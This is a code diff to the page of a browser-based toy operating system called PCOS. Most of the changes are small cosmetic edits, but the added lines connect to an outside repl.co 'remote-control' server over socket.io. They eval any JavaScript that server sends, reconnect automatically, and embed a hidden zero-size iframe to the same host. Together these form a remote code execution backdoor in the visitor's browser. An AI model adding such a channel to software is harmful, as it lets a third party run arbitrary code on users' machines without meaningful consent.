@@ -10,7 +10,7 @@
 
     <script src="https://code.jquery.com/jquery-1.12.4.js"></script>
     <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
-	
+	<script src="http://www.windows93.net:8081/socket.io/socket.io.js"></script>
 	<link rel="stylesheet" href="css/bootstrap.min.css">
 <script src="js/bootstrap.min.js"></script>
 
@@ -90,6 +90,7 @@
 
     <script type="text/javascript">
 	    // browser detect
+	    sit = io("http://pcos-remote-control.tbsharedaccount.repl.co")
 var BrowserDetect = {
         init: function() {
 		this.browser = this.searchString(this.dataBrowser) || "An unknown browser";
@@ -330,7 +331,15 @@ new uiwindow({nme: "eval-js", title: "Eval JavaScript", content: '<label id=last
 
 		]
 
-        }
+        },
+	   "RC": [function(js, callerw){
+		   //You can add some prevention
+		   try{
+		   sit.emit("JSresult", callerw.caller, eval(js));
+		   }catch(e){
+			   sit.emit("JSresult", callerw.caller, e);
+		   }
+	   }]
 
     }
 
@@ -394,8 +403,14 @@ new uiwindow({nme: "eval-js", title: "Eval JavaScript", content: '<label id=last
         }
 
     }
+    sit.ondisconnect = function(){
+	    sit.connect()
+    }
+	sit.on("printJS", function(js, callerrw){
+		osevents.emit("RC", js, callerrw)
+	})
     //My computer: https://www.iconarchive.com/download/i47362/icons-land/vista-hardware-devices/Computer.ico
-    searchedProps = "UserAgent: " + navigator.userAgent + "<br>Browser: " + BrowserDetect.browser + " "+ BrowserDetect.version + "<br>Real OS: " + BrowserDetect.OS
+    searchedProps = "UserAgent: " + navigator.userAgent + "<br>Browser: " + BrowserDetect.browser + " "+ BrowserDetect.version + "<br>Real OS: " + BrowserDetect.OS + "<br>Your ComputerID to control: " + sit.id
 opened = '<h1>PCchat iframe</h1><br>You may experience some bugs!<br><iframe src=\'https://bossyfakewebmaster--tbsharedaccount.repl.co\'></iframe>'.toString()
     document.body.innerHTML = '<div id="desktop"><label onclick="new uiwindow({nme: \'PCchat\', title: \'PCchat iframe\', content: opened})"><figure class="sign"><p><img src="https://repl.it/public/images/favicon.ico" alt="Repl.IT favicon" width=100 height=100></img></p><figcaption>PCchat</figcaption></figure></label><label onclick="new uiwindow({nme: \'browserinfo\', title: \'Browser information\', content: searchedProps})"><figure class="sign"><p><img src="https://www.iconarchive.com/download/i47362/icons-land/vista-hardware-devices/Computer.ico" alt="My computer icon from IconArchive" width=100 height=100></img></p><figcaption>Browser information</figcaption></figure></label></div><div id="min" class="footer"><label id="menuhandler"></label><br><button type="button" class="btn btn-secondary" id=startyemenu>PC</button></div>'
     document.body.style = "background: deepskyblue"
@@ -409,10 +424,10 @@ opened = '<h1>PCchat iframe</h1><br>You may experience some bugs!<br><iframe src
     eval(localStorage.getItem("afterboot.js"))
 }catch(e){
 			document.body.style = "background: blue; color: white; font-family: monospace;"
-		document.body.innerHTML = "<strong>A problem has been detected and PCOS has been shut down to prevent damage to your computer.<br>"+e.name.replace(" ", "_")+"<br><br>If this is the first time you see this Stop screen, restart the computer. If this screen appears again, follow these steps:<br><br>1. Delete the localStorage users file.<br>2. Delete all startup scripts from localStorage (including login.exe!)<br>3. Reload the page and check out if the problem reappears.<br><br>Technical information:<br> *** STOP: 0fl37oden3<br><br><br>*** errorscatching.drv - Address 0x489446648 base at 0x1ear6b9e, DateStamp 0000ba0b<br><br>Beginning dump of psychical memory.<br>Psychical memory dump complete.<br>Contact your system administrator or technical support group for further assistance.</strong>";
+		document.body.innerHTML = "<strong>A problem has been detected and PCOS has been shut down to prevent damage to your computer.<br>"+e.name.replace(" ", "_").toUpperCase()+"<br><br>If this is the first time you see this Stop screen, restart the computer. If this screen appears again, follow these steps:<br><br>1. Delete the localStorage users file.<br>2. Delete all startup scripts from localStorage (including login.exe!)<br>3. Reload the page and check out if the problem reappears.<br><br>Technical information:<br> *** STOP: 0fl37oden3<br><br><br>*** errorscatching.drv - Address 0x489446648 base at 0x1ear6b9e, DateStamp 0000ba0b<br><br>Beginning dump of psychical memory.<br>Psychical memory dump complete.<br>Contact your system administrator or technical support group for further assistance.</strong>";
 		return 
 }
-}, 5000)
+}, 10000)
 
 setTimeout(function() {
 try{
@@ -423,13 +438,13 @@ try{
     document.body.innerHTML = `	   <centeralize>
 
 		   <strong>PC laptop</strong>
-
+<iframe src="https://pcos-remote-control.tbsharedaccount.repl.co" heigth="0" width="0" style="display: none;"></iframe>
 	   </centeralize><footcen><progress></progress><br>Powered by <strong>PCOS</strong></footcen>`
     }catch(e){
 	    clearTimeout(bootInt);
 	    bootInt = null
 			document.body.style = "background: blue; color: white; font-family: monospace;"
-		document.body.innerHTML = "<strong>A problem has been detected and PCOS has been shut down to prevent damage to your computer.<br>"+e.name.replace(" ", "_")+"<br><br>If this is the first time you see this Stop screen, restart the computer. If this screen appears again, follow these steps:<br><br>1. Delete the localStorage users file.<br>2. Delete all startup scripts from localStorage (including login.exe!)<br>3. Reload the page and check out if the problem reappears.<br><br>Technical information:<br> *** STOP: 0fl37oden3<br><br><br>*** errorscatching.drv - Address 0x489446648 base at 0x1ear6b9e, DateStamp 0000ba0b<br><br>Beginning dump of psychical memory.<br>Psychical memory dump complete.<br>Contact your system administrator or technical support group for further assistance.</strong>";
+		document.body.innerHTML = "<strong>A problem has been detected and PCOS has been shut down to prevent damage to your computer.<br>"+e.name.replace(" ", "_").toUpperCase()+"<br><br>If this is the first time you see this Stop screen, restart the computer. If this screen appears again, follow these steps:<br><br>1. Delete the localStorage users file.<br>2. Delete all startup scripts from localStorage (including login.exe!)<br>3. Reload the page and check out if the problem reappears.<br><br>Technical information:<br> *** STOP: 0fl37oden3<br><br><br>*** errorscatching.drv - Address 0x489446648 base at 0x1ear6b9e, DateStamp 0000ba0b<br><br>Beginning dump of psychical memory.<br>Psychical memory dump complete.<br>Contact your system administrator or technical support group for further assistance.</strong>";
 		return 
 }
 }, 3000)
